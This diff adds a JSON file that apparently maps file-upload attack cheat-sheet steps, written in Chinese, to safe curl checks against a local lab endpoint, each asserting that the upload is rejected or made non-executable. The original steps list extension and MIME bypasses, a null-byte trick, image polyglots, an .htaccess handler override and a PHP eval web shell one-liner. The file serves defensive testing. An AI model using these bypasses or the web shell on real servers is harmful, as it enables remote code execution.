@@ -1,0 +1,52 @@
+{
+  "schemaVersion": 1,
+  "entries": [
+    {
+      "id": "rce-file-upload",
+      "patches": [
+        {
+          "area": "execution",
+          "index": 0,
+          "expectedCommand": "上传PHP文件: shell.php\n上传JSP文件: shell.jsp\n上传ASPX文件: shell.aspx\n上传CGI文件: shell.cgi",
+          "command": "curl --fail-with-body --silent --show-error --max-time 10 -X POST \"http://127.0.0.1:18080/lab/upload\" -H \"X-Request-ID: upload-a1\" -F \"file=@fixtures/upload-marker.txt;filename=marker.txt;type=text/plain\" | jq -e '.request_id == \"upload-a1\" and .stored_extension == \".txt\" and .executable == false'"
+        },
+        {
+          "area": "execution",
+          "index": 1,
+          "expectedCommand": "# 修改Content-Type\nContent-Type: image/jpeg\n\n# 修改文件扩展名\ntest.php -> test.jpg.php\ntest.php -> test.php.jpg\n\n# 使用空字节\ntest.php%00.jpg",
+          "command": "curl --fail-with-body --silent --show-error --max-time 10 -X POST \"http://127.0.0.1:18080/lab/upload\" -H \"X-Request-ID: upload-b2\" -F \"file=@fixtures/upload-marker.txt;filename=marker.jpg.php;type=image/jpeg\" | jq -e '.accepted == false and .reason'"
+        },
+        {
+          "area": "execution",
+          "index": 2,
+          "expectedCommand": "# 黑名单绕过\n.php -> .phtml, .php3, .php5, .pht\n.asp -> .asa, .cer, .cdx\n.jsp -> .jspx, .jspf\n\n# 大小写绕过\n.Php, .pHp, .PHP\n\n# 双写绕过\n.pphphp",
+          "command": "for name in marker.phtml marker.PHp marker.php5 marker.php.; do curl --silent --show-error --max-time 5 -X POST \"http://127.0.0.1:18080/lab/upload\" -H \"X-Request-ID: upload-c3\" -F \"file=@fixtures/upload-marker.txt;filename=$name;type=text/plain\" | jq -c '{stored_name,accepted,reason,executable}'; done"
+        },
+        {
+          "area": "execution",
+          "index": 3,
+          "expectedCommand": "# 制作图片马\ncopy test.jpg/b + shell.php/a shell.jpg\n\n# 利用文件包含执行\ninclude($_GET['file']);\n?file=upload/shell.jpg",
+          "command": "curl --fail-with-body --silent --show-error --max-time 10 -X POST \"http://127.0.0.1:18080/lab/upload\" -H \"X-Request-ID: upload-d4\" -F \"file=@fixtures/gif89a-marker.bin;filename=marker.gif;type=image/gif\" | jq -e '.detected_type == \"image/gif\" and .decoded_image == false and .executable == false'"
+        },
+        {
+          "area": "execution",
+          "index": 4,
+          "expectedCommand": "# 上传.htaccess文件\nAddType application/x-httpd-php .jpg\nAddHandler php-script .jpg\n\n# 之后上传的jpg文件会被当作PHP执行",
+          "command": "curl --silent --show-error --max-time 10 -X POST \"http://127.0.0.1:18080/lab/upload\" -H \"X-Request-ID: upload-e5\" -F \"file=@fixtures/htaccess-marker.txt;filename=.htaccess;type=text/plain\" | jq -e '.accepted == false and .reason'"
+        },
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "修改请求中的Content-Type为允许的类型\nimage/jpeg, image/png, image/gif",
+          "command": "curl --silent --show-error --max-time 10 -X POST \"http://127.0.0.1:18080/lab/upload\" -H \"X-Request-ID: upload-f6\" -F \"file=@fixtures/upload-marker.txt;filename=marker.jpg;type=image/jpeg\" | jq -e '.accepted == false and .detected_type == \"text/plain\"'"
+        },
+        {
+          "area": "wafBypass",
+          "index": 1,
+          "expectedCommand": "在恶意文件前添加图片文件头\nGIF89a<?php eval($_POST[cmd]);?>",
+          "command": "curl --silent --show-error --max-time 10 -X POST \"http://127.0.0.1:18080/lab/upload\" -H \"X-Request-ID: upload-g7\" -F \"file=@fixtures/gif89a-marker.bin;filename=marker.txt;type=text/plain\" | jq -e '.accepted == false and .detected_type == \"image/gif\"'"
+        }
+      ]
+    }
+  ]
+}
